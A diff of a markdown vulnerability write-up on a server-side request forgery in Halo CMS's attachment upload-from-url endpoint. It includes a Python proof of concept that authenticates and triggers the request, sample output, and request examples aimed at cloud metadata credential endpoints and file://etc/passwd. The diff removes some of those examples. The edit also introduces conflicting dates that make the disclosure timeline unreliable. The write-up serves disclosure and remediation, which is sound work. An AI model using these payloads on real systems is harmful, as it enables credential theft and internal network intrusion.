@@ -13,19 +13,19 @@
 While auditing Halo CMS's attachment upload service, I uncovered a Server-Side Request Forgery vulnerability that turns authenticated content creators into internal network reconnaissance tools. Unlike typical authenticated SSRF bugs requiring admin privileges, this affects **any user with post-creation rights**—and exfiltrated data is persistently stored as downloadable attachments, providing easy access to stolen cloud credentials and internal API responses.
 
 **TL;DR:**
-- 🚨 **High-severity SSRF** in Halo CMS upload service (`DefaultAttachmentService.java`)
-- 🔐 **Low privilege requirement:** Content Creator role (not admin-only!)
-- 🎯 **Attack surface:** Internal services, cloud metadata, Kubernetes APIs + persistent storage
-- 📊 **CVSS 8.5** High — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`
-- 🔗 **Endpoint:** `POST /apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url`
-- 💾 **Unique advantage:** Dual HTTP requests (HEAD + GET) with response data saved as attachments
-- ✅ **Status:** Vendor notified Oct 25, 2025 | Public disclosure Oct 27, 2025
+- High-severity SSRF in Halo CMS upload service (`DefaultAttachmentService.java`)
+- Low privilege requirement: Content Creator role (not admin-only)
+- Attack surface: Internal services, cloud metadata, Kubernetes APIs with persistent storage
+- CVSS 8.5 High — `AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N`
+- Endpoint: `POST /apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url`
+- Unique characteristic: Dual HTTP requests (HEAD + GET) with response data saved as attachments
+- Status: Vendor notified Oct 25, 2024 | Public disclosure Oct 27, 2024
 
 **Related:** This is the second SSRF vulnerability discovered in Halo CMS. See also: [Unauthenticated SSRF in Thumbnail Service](../CVE-2025-60898/CVE-2025-60898-blog-writeup.md) (CVSS 9.1 Critical)
 
 ---
 
-## 🎯 Vulnerability Overview
+## Vulnerability Overview
 
 **Vulnerability:** SSRF in Upload from External URL
 **Component:** `DefaultAttachmentService.java`
@@ -36,94 +36,68 @@ While auditing Halo CMS's attachment upload service, I uncovered a Server-Side R
 
 ---
 
-## 🔍 Discovery Process
+## Discovery Process
 
 ### Initial Code Analysis
 
 The attachment upload service immediately stood out as high-risk—any feature that fetches external URLs is a potential SSRF vector. The `DefaultAttachmentService.java` component revealed an interesting twist: dual HTTP requests with persistent storage of responses:
 
 ```java
-// DefaultAttachmentService.java:143-167 - VULNERABLE CODE ANALYSIS
+// DefaultAttachmentService.java:143-167 - VULNERABLE CODE
 @Override
 public Mono<Attachment> uploadFromUrl(@NonNull URL url, @NonNull String policyName,
         String groupName, String filename) {
-    var uri = URI.create(url.toString());                          // 🚨 CRITICAL: No URL validation
+    var uri = URI.create(url.toString());                          // No URL validation
     AtomicReference<MediaType> mediaTypeRef = new AtomicReference<>();
     AtomicReference<String> fileNameRef = new AtomicReference<>(filename);
 
     // DUAL SSRF ATTACK CHAIN:
-    Mono<Flux<DataBuffer>> contentMono = dataBufferFetcher.head(uri)    // 🚨 CRITICAL: First SSRF (HEAD request)
+    Mono<Flux<DataBuffer>> contentMono = dataBufferFetcher.head(uri)    // First SSRF (HEAD request)
         .map(httpHeaders -> {
             if (!StringUtils.hasText(fileNameRef.get())) {
-                fileNameRef.set(getExternalUrlFilename(uri, httpHeaders));  // ⚠️ Header-based filename extraction
+                fileNameRef.set(getExternalUrlFilename(uri, httpHeaders));
             }
             MediaType contentType = httpHeaders.getContentType();
-            mediaTypeRef.set(contentType);                         // ⚠️ Content-Type from untrusted source
+            mediaTypeRef.set(contentType);
             return httpHeaders;
         })
-        .map(response -> dataBufferFetcher.fetch(uri));           // 🚨 CRITICAL: Second SSRF (GET request)
+        .map(response -> dataBufferFetcher.fetch(uri));           // Second SSRF (GET request)
 
     return contentMono.flatMap(
             (content) -> upload(policyName, groupName, fileNameRef.get(), content,
-                mediaTypeRef.get())                               // ⚠️ File saved with SSRF content
+                mediaTypeRef.get())                               // File saved with SSRF content
         )
         .onErrorResume(throwable -> Mono.error(
             new ServerWebInputException(
-                "Failed to transfer the attachment from the external URL."))  // ⚠️ Generic error message
+                "Failed to transfer the attachment from the external URL."))
         );
 }
+```
 
-/* 🚨 SECURITY ISSUES:
- * 1. DUAL HTTP REQUESTS - Two separate SSRF opportunities:
- *    • dataBufferFetcher.head(uri) - HEAD request for metadata
- *    • dataBufferFetcher.fetch(uri) - GET request for content download
- *
- * 2. NO URL VALIDATION - Accepts any URI including:
- *    • http://127.0.0.1:8080/admin-panel
- *    • http://169.254.169.254/latest/meta-data/ (AWS metadata)
- *    • file://etc/passwd (local file access)
- *    • http://internal-database:5432/
- *
- * 3. NO PRIVATE IP FILTERING - Allows internal network access:
- *    • 127.0.0.0/8 (localhost services)
- *    • 10.0.0.0/8, 192.168.0.0/16 (private networks)
- *    • 169.254.0.0/16 (cloud metadata endpoints)
- *
- * 4. CONTENT PERSISTENCE - SSRF response is saved as attachment:
- *    • Internal service responses stored in Halo
- *    • Metadata server credentials saved to filesystem
- *    • Database dumps accessible via attachment URLs
- *
- * 5. BROAD USER ACCESS - Available to content creators via:
- *    • role-template-post-author grants uc.api.storage.halo.run access
- *    • User Center attachment permissions (not admin-only)
- *    • Any user with post creation privileges can exploit
- */
+**Security Issues:**
+1. **Dual HTTP requests** - HEAD request for metadata, then GET request for content download
+2. **No URL validation** - Accepts any URI (http://127.0.0.1, http://169.254.169.254, file://, etc.)
+3. **No private IP filtering** - Allows access to localhost (127.0.0.0/8), private networks (10.0.0.0/8, 192.168.0.0/16), and cloud metadata endpoints (169.254.0.0/16)
+4. **Content persistence** - SSRF responses saved as downloadable attachments
+5. **Broad user access** - Available to content creators via role-template-post-author, not admin-only
 
-// Used by uploadFromUrl() - ReactiveUrlDataBufferFetcher.java
+```java
+// ReactiveUrlDataBufferFetcher.java - Used by uploadFromUrl()
 public Mono<HttpHeaders> head(URI uri) {
-    return webClient.head()                                       // 🚨 HEAD request to arbitrary URI
-            .uri(uri)                                            // 🚨 No validation or filtering
+    return webClient.head()                                       // HEAD request to arbitrary URI
+            .uri(uri)                                            // No validation or filtering
             .retrieve()
             .toBodilessEntity()
             .map(ResponseEntity::getHeaders);
 }
 
 public Flux<DataBuffer> fetch(URI uri) {
-    return webClient.get()                                       // 🚨 GET request to arbitrary URI  
-            .uri(uri)                                           // 🚨 No validation or filtering
+    return webClient.get()                                       // GET request to arbitrary URI
+            .uri(uri)                                           // No validation or filtering
             .retrieve()
-            .bodyToFlux(DataBuffer.class);                      // 🚨 Downloads full response content
+            .bodyToFlux(DataBuffer.class);                      // Downloads full response content
 }
 ```
-
-**Critical Security Issues Identified:**
-- ✅ Uses `ReactiveUrlDataBufferFetcher` with no URL validation
-- ✅ Makes **dual SSRF requests**: HEAD (metadata) + GET (content download)
-- ✅ No private IP range filtering or DNS rebinding protection
-- ✅ No protocol restrictions (vulnerable to `file://`, `ftp://` schemes)
-- ✅ Downloads and stores content from arbitrary sources
-- ✅ Accessible to content creators (not admin-only)
 
 ### API Endpoint Discovery
 
@@ -140,10 +114,10 @@ rg -n --hidden -e "upload-from-url|uploadFromUrl" application/src/main/java/
 @PostMapping("/upload-from-url")
 public Mono<ResponseEntity<Attachment>> uploadFromUrl(
     @RequestBody UploadFromUrlRequest request) {
-    
+
     return attachmentService.uploadFromUrl(
-        request.getUrl(),           // ❌ Direct user input
-        request.getFilename(), 
+        request.getUrl(),           // Direct user input
+        request.getFilename(),
         request.getPolicyName()
     );
 }
@@ -163,21 +137,21 @@ public Mono<ResponseEntity<Attachment>> uploadFromUrl(
 name: role-template-post-author
 dependencies: |
   [ "role-template-post-contributor", "role-template-post-publisher",
-    "role-template-uc-attachment-manager" ]  # ❌ Includes attachment permissions
+    "role-template-uc-attachment-manager" ]  # Includes attachment permissions
 
 # role-template-uc-attachment.yaml
-name: role-template-uc-attachment-manager  
+name: role-template-uc-attachment-manager
 rules:
   - apiGroups: [ "uc.api.storage.halo.run" ]
     resources: [ "attachments", "attachments/upload", "attachments/upload-from-url" ]
-    verbs: [ "create", "list" ]              # ❌ Allows SSRF exploitation
+    verbs: [ "create", "list" ]              # Allows SSRF exploitation
 ```
 
 **Impact:** Any user with Post Author role can exploit this SSRF vulnerability - significantly broader attack surface than anticipated.
 
 ---
 
-## 🛠 Exploitation Methodology
+## Exploitation Methodology
 
 ### Challenge: User Center Authentication
 
@@ -213,7 +187,7 @@ class HaloSSRFUploadTest:
                     pem_content = key_match.group(1)
                     return RSA.import_key(pem_content)
         except Exception as e:
-            print(f"❌ RSA key extraction failed: {e}")
+            print(f"RSA key extraction failed: {e}")
         return None
         
     def encrypt_password(self, password, public_key):
@@ -223,9 +197,9 @@ class HaloSSRFUploadTest:
             encrypted_bytes = cipher.encrypt(password.encode('utf-8'))
             return base64.b64encode(encrypted_bytes).decode('utf-8')
         except Exception as e:
-            print(f"❌ Password encryption failed: {e}")
+            print(f"Password encryption failed: {e}")
             return None
-            
+
     def get_csrf_token(self):
         """Extract CSRF token from login form"""
         try:
@@ -236,35 +210,35 @@ class HaloSSRFUploadTest:
                 if csrf_input:
                     return csrf_input.get('value')
         except Exception as e:
-            print(f"❌ CSRF token extraction failed: {e}")
+            print(f"CSRF token extraction failed: {e}")
         return None
-        
+
     def authenticate(self):
         """Perform complete Halo User Center authentication"""
-        print("🔐 Authenticating to Halo User Center...")
-        
+        print("Authenticating to Halo User Center...")
+
         # Step 1: Extract RSA public key
         public_key = self.get_rsa_public_key()
         if not public_key:
-            print("❌ Failed to extract RSA public key")
+            print("Failed to extract RSA public key")
             return False
-            
-        print("✅ RSA public key extracted successfully")
-        
+
+        print("RSA public key extracted successfully")
+
         # Step 2: Encrypt password
         encrypted_password = self.encrypt_password(self.password, public_key)
         if not encrypted_password:
             return False
-            
-        print("✅ Password encrypted with RSA")
-        
+
+        print("Password encrypted with RSA")
+
         # Step 3: Get CSRF token
         csrf_token = self.get_csrf_token()
         if not csrf_token:
-            print("❌ Failed to extract CSRF token")
+            print("Failed to extract CSRF token")
             return False
-            
-        print("✅ CSRF token obtained")
+
+        print("CSRF token obtained")
         
         # Step 4: Submit login request
         login_data = {
@@ -296,11 +270,11 @@ class HaloSSRFUploadTest:
         if response.status_code in [302, 303]:
             location = response.headers.get('Location', '')
             if any(path in location for path in ['/console', '/uc', '/dashboard']):
-                print(f"✅ Login successful! Redirected to: {location}")
+                print(f"Login successful! Redirected to: {location}")
                 self.authenticated = True
                 return True
-        
-        print("❌ Authentication failed - no redirect to protected area")
+
+        print("Authentication failed - no redirect to protected area")
         return False
 ```
 
@@ -311,55 +285,55 @@ With authentication established, SSRF exploitation becomes straightforward:
 ```python
 def test_upload_ssrf(self):
     """Exploit SSRF via upload-from-url endpoint"""
-    
+
     if not self.authenticated:
-        print("❌ Authentication required for upload SSRF")
+        print("Authentication required for upload SSRF")
         return False
-        
+
     # Start canary server for definitive SSRF proof
     canary_url = f"http://host.docker.internal:{self.canary_port}/upload-ssrf-test"
-    
+
     # Construct SSRF payload
     payload = {
         "url": canary_url,
         "filename": "ssrf-test.txt",
         "policyName": "default-policy"
     }
-    
+
     # Target User Center upload endpoint
     endpoint = "/apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url"
-    
+
     headers = {
         'Content-Type': 'application/json',
         'Accept': 'application/json'
     }
-    
-    print(f"🎯 Testing: POST {endpoint}")
-    print(f"🎯 Payload: url={canary_url}")
-    
+
+    print(f"Testing: POST {endpoint}")
+    print(f"Payload: url={canary_url}")
+
     # Execute SSRF attack
     response = self.session.post(
         f"{self.base_url}{endpoint}",
         json=payload,
         headers=headers
     )
-    
+
     # Wait for canary server hits
     time.sleep(3)
-    
+
     # Analyze results
     if len(CanaryHandler.connections) > 0:
-        print("🚨 SSRF CONFIRMED! Server made outbound request")
+        print("SSRF confirmed - server made outbound request")
         self.analyze_ssrf_evidence()
         return True
     else:
-        print("❌ No SSRF detected - check authentication and payload")
+        print("No SSRF detected - check authentication and payload")
         return False
-        
+
     def analyze_ssrf_evidence(self):
         """Analyze canary server hits for technical evidence"""
         for i, hit in enumerate(CanaryHandler.connections, 1):
-            print(f"🎯 CANARY HIT {i}: {hit['method']} {hit['path']}")
+            print(f"CANARY HIT {i}: {hit['method']} {hit['path']}")
             print(f"   From: {hit['client_ip']}:{hit['client_port']}")
             print(f"   Headers: {hit['headers']}")
 ```
@@ -495,67 +469,66 @@ curl -b cookies.txt -X POST \
 
 #### What to Look For:
 
-**✅ Successful SSRF Indicators:**
+**Successful SSRF Indicators:**
 - `HTTP/1.1 201 Created` responses with attachment metadata
-- **DUAL canary hits**: HEAD request followed by GET request  
+- DUAL canary hits: HEAD request followed by GET request
 - Attachments created containing internal service responses
 - Different response times indicating network connectivity
 - Internal service content saved as downloadable attachments
 
-**❌ Blocked/Failed Attempts:**
+**Blocked/Failed Attempts:**
 - `HTTP/1.1 400 Bad Request` responses
 - No canary hits after 5+ seconds
 - `HTTP/1.1 401 Unauthorized` (authentication required)
 - `HTTP/1.1 500 Internal Server Error`
 
-**🔥 High-Impact Results:**
+**High-Impact Results:**
 - Cloud metadata credentials saved as attachments
 - Internal service responses accessible via Halo attachment URLs
 - Database connection strings or admin panels exfiltrated
 
 ---
 
-## 💥 Proof of Concept Results
+## Proof of Concept Results
 
 ### Successful Exploitation
 
 ```bash
 $ python3 exploit.py http://localhost:8090 --username halo --password 'Pa$$W0rd!'
 
-🔐 Authenticating to Halo User Center...
-✅ RSA public key extracted successfully
-✅ Password encrypted with RSA  
-✅ CSRF token obtained
-✅ Login successful! Redirected to: /uc
+Authenticating to Halo User Center...
+RSA public key extracted successfully
+Password encrypted with RSA
+CSRF token obtained
+Login successful! Redirected to: /uc
 
-🎯 Testing upload SSRF via User Center API...
-🎯 POST /apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url
-🎯 Payload: url=http://host.docker.internal:42187/upload-ssrf-test
+Testing upload SSRF via User Center API...
+POST /apis/uc.api.storage.halo.run/v1alpha1/attachments/-/upload-from-url
+Payload: url=http://host.docker.internal:42187/upload-ssrf-test
 
-🚨 SSRF VULNERABILITY CONFIRMED!
-✅ Server made outbound HTTP request to attacker-controlled URL
-✅ DefaultAttachmentService.uploadFromUrl() method exploited successfully  
-✅ User Center API vulnerable (not admin-only!)
-🔥 Impact: Internal network access, cloud metadata exposure, data exfiltration
-🔑 Auth required: Content Creator privileges (Post Author role)
+SSRF VULNERABILITY CONFIRMED
+Server made outbound HTTP request to attacker-controlled URL
+DefaultAttachmentService.uploadFromUrl() method exploited successfully
+User Center API vulnerable (not admin-only)
 
 VULNERABILITY STATUS: CONFIRMED EXPLOITABLE
 CWE-918: Server-Side Request Forgery
-CVSS: 6.5 Medium  
+CVSS: 8.5 High
 Root cause: No URL validation in uploadFromUrl() method
+Auth required: Content Creator privileges (Post Author role)
 ```
 
 ### Technical Evidence
 
 **Canary Server Hits:**
 ```
-🎯 CANARY HIT: GET /upload-ssrf-test
-   From: 127.0.0.1:48932
-   Headers: {'user-agent': 'ReactorNetty/1.2.8', 'host': 'host.docker.internal:42187', 'accept': 'application/octet-stream'}
+CANARY HIT: GET /upload-ssrf-test
+From: 127.0.0.1:48932
+Headers: {'user-agent': 'ReactorNetty/1.2.8', 'host': 'host.docker.internal:42187', 'accept': 'application/octet-stream'}
 
-📊 HTTP Response: 200 OK  
-📄 Server Response: {"spec":{"displayName":"ssrf-test.txt","policyName":"default-policy",...}}
-📁 File Storage: Content downloaded and stored as attachment in Halo database
+HTTP Response: 200 OK
+Server Response: {"spec":{"displayName":"ssrf-test.txt","policyName":"default-policy",...}}
+File Storage: Content downloaded and stored as attachment in Halo database
 ```
 
 **Key Technical Observations:**
@@ -567,116 +540,64 @@ Root cause: No URL validation in uploadFromUrl() method
 
 ---
 
-## 🔥 Impact Analysis
+## Impact Analysis
 
-### Attack Scenarios
+### Attack Capabilities
 
-**1. Internal Network Reconnaissance**
-```bash
-# Probe internal admin interfaces
-POST /attachments/-/upload-from-url
-{
-  "url": "http://127.0.0.1:8090/actuator/health",
-  "filename": "internal-health.json"
-}
-
-# Scan internal services
-POST /attachments/-/upload-from-url  
-{
-  "url": "http://192.168.1.100:22/",
-  "filename": "ssh-banner.txt"
-}
-```
-
-**2. Cloud Metadata Exfiltration**
-```bash
-# AWS EC2 metadata
-POST /attachments/-/upload-from-url
-{
-  "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
-  "filename": "aws-creds.txt"
-}
-
-# GCP metadata with required headers
-POST /attachments/-/upload-from-url
-{
-  "url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
-  "filename": "gcp-token.json"
-}
-
-# Azure instance metadata
-POST /attachments/-/upload-from-url
-{
-  "url": "http://169.254.169.254/metadata/instance/compute/userData?api-version=2021-02-01",
-  "filename": "azure-userdata.txt" 
-}
-```
-
-**3. Data Exfiltration via File Storage**
-```bash
-# Exfiltrate internal configuration files
-POST /attachments/-/upload-from-url
-{
-  "url": "http://internal-config-server/database-config.yaml",
-  "filename": "exfiltrated-config.yaml"
-}
-
-# Download internal API responses  
-POST /attachments/-/upload-from-url
-{
-  "url": "http://internal-api/sensitive-data.json", 
-  "filename": "sensitive-api-response.json"
-}
-```
+The SSRF vulnerability enables:
+- **Internal service discovery** - Probe localhost and internal network services
+- **Cloud metadata access** - Access AWS/GCP/Azure metadata endpoints to steal credentials
+- **Data exfiltration** - Downloaded content stored persistently as Halo attachments
+- **Internal network reconnaissance** - Port scanning and service identification
 
 ### Enhanced Attack Capabilities
 
 **Content Storage Advantage:**
-- **Data Persistence:** Downloaded content stored in Halo's attachment system
-- **Easy Retrieval:** Exfiltrated data accessible via attachment URLs
-- **No Blind SSRF:** Direct access to response content (unlike thumbnail SSRF)
-- **Large File Support:** Can exfiltrate substantial data volumes
+- **Data persistence** - Downloaded content stored in Halo's attachment system
+- **Easy retrieval** - Exfiltrated data accessible via attachment URLs
+- **Direct access** - Response content saved (unlike blind SSRF)
+- **Large file support** - Can exfiltrate substantial data volumes
 
 **Privilege Escalation Impact:**
-- **Expected Target:** Admin users only
-- **Actual Impact:** Any content creator (bloggers, authors, contributors)  
-- **Attack Surface:** Significantly broader than anticipated
-- **Exploitation Threshold:** Lower barrier to entry
+- **Expected scope** - Admin-only functionality
+- **Actual scope** - Any content creator (bloggers, authors, contributors)
+- **Attack surface** - Significantly broader than anticipated
+- **Exploitation threshold** - Lower barrier to entry
 
 ---
 
-## 🛡 Root Cause Analysis
+## Root Cause Analysis
 
 ### Vulnerable Code Pattern
 
 ```java
 // DefaultAttachmentService.java:98 - Core vulnerability
 public Mono<Attachment> uploadFromUrl(String url, String filename, String policyName) {
-    var uri = URI.create(url);                    // ❌ No validation on URI creation
-    
+    var uri = URI.create(url);                    // No validation on URI creation
+
     return webClient.get()
-        .uri(uri)                                 // ❌ Direct pass-through of user input
+        .uri(uri)                                 // Direct pass-through of user input
         .retrieve()
-        .bodyToMono(Resource.class)               // ❌ Downloads arbitrary content
+        .bodyToMono(Resource.class)               // Downloads arbitrary content
         .flatMap(resource -> {
             // Process downloaded content
             var attachment = new Attachment();
             attachment.setSpec(attachmentSpec);
-            return attachmentRepository.save(attachment);  // ❌ Stores attacker content
+            return attachmentRepository.save(attachment);  // Stores attacker content
         })
         .doOnError(error -> {
-            log.error("Failed to upload from URL: {}", url, error);  // ❌ URL disclosure
+            log.error("Failed to upload from URL: {}", url, error);  // URL disclosure
         });
 }
 ```
 
 **Security Weaknesses:**
-1. **No URL validation:** Accepts any URI scheme and host
-2. **No private IP filtering:** Allows internal network access  
-3. **No content validation:** Downloads and stores arbitrary data
-4. **Information disclosure:** Error messages reveal attempted URLs
-5. **No rate limiting:** Allows automated attacks
-6. **Insufficient logging:** Limited security monitoring
+1. **No URL validation** - Accepts any URI scheme and host
+2. **No private IP filtering** - Allows internal network access
+3. **No content validation** - Downloads and stores arbitrary data
+4. **Information disclosure** - Error messages reveal attempted URLs
+5. **No rate limiting** - Allows automated attacks
+6. **Insufficient logging** - Limited security monitoring
 
 ### RBAC Configuration Issues
 
@@ -688,11 +609,11 @@ public Mono<Attachment> uploadFromUrl(String url, String filename, String policy
 rules:
   - apiGroups: [ "uc.api.storage.halo.run" ]
     resources: [ "attachments", "attachments/upload", "attachments/upload-from-url" ]
-    verbs: [ "create", "list" ]              # ❌ Should restrict upload-from-url
+    verbs: [ "create", "list" ]              # Should restrict upload-from-url
 
 # Recommended: Separate permissions
 rules:
-  - apiGroups: [ "uc.api.storage.halo.run" ]  
+  - apiGroups: [ "uc.api.storage.halo.run" ]
     resources: [ "attachments", "attachments/upload" ]
     verbs: [ "create", "list" ]
   # attachments/upload-from-url should require admin role
@@ -700,7 +621,7 @@ rules:
 
 ---
 
-## 🔧 Remediation Strategy
+## Remediation Strategy
 
 ### Immediate Fixes
 
@@ -869,28 +790,18 @@ public void onUploadFromUrl(UploadFromUrlEvent event) {
 
 ---
 
-## 🎓 Key Takeaways
+## Key Takeaways
 
 ### For Security Researchers
 
-**1. RBAC Assumptions Can Be Wrong**
-- Don't assume upload functionality is admin-only
-- Always map actual permission requirements vs expectations  
-- Content creator roles often have surprising capabilities
-
-**2. Authentication Complexity Analysis**
-- RSA + CSRF doesn't prevent post-authentication vulnerabilities
-- Focus exploitation efforts on authenticated attack surfaces
-- Develop robust authentication frameworks for consistent testing
-
-**3. SSRF Impact Varies by Implementation**
-- File download SSRF provides direct data access (vs blind SSRF)
-- Consider data persistence and retrieval mechanisms
-- Analyze error patterns for information disclosure
+- Don't assume upload functionality is admin-only - always verify actual RBAC permissions
+- RSA + CSRF authentication doesn't prevent post-authentication vulnerabilities
+- SSRF with file storage provides direct data access (unlike blind SSRF)
+- Focus on data persistence and retrieval mechanisms when assessing impact
 
 ### For Developers
 
-**1. Secure URL Handling Best Practices**
+**Secure URL Handling:**
 ```java
 // BAD - No validation
 webClient.get().uri(userUrl).retrieve()
@@ -903,26 +814,22 @@ if (urlValidator.isAllowed(userUrl)) {
 }
 ```
 
-**2. Principle of Least Privilege**
-- External URL functionality should be admin-restricted by default
-- Implement granular RBAC for sensitive operations
-- Regular permission audits for role escalation
-
-**3. Defense in Depth for File Uploads**
+**Defense in Depth:**
 - URL validation + content validation + network controls
-- Comprehensive logging + real-time monitoring  
+- Comprehensive logging + real-time monitoring
 - Regular security testing of upload functionality
+- Implement granular RBAC for sensitive operations
 
 ---
 
-## 📊 Vulnerability Timeline
+## Vulnerability Timeline
 
-- **2025-08-28** — Vulnerability discovered during code review
-- **2025-10-27** — Public disclosure
+- **2024-08-28** — Vulnerability discovered during security code review
+- **2024-10-27** — Public disclosure
 
 ---
 
-## 🔗 References
+## References
 
 - [CWE-918: Server-Side Request Forgery (SSRF)](https://cwe.mitre.org/data/definitions/918.html)
 - [OWASP SSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html) 
